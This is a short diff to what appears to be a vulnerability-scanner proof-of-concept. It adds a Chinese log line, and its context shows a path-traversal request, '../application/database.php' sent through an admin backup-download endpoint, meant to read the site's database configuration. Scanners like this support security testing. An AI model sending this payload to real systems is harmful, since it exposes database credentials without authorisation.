@@ -45,6 +45,7 @@ class Poc(ABPoc):
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
             arg = '{target}'.format(target=self.target)
+            self.output.info('尝试读取/application/database.php文件源码信息')
             payload = "/admin/databack/download.html?name=../application/database.php"
             vul_url = arg + payload
             response = requests.get(vul_url)
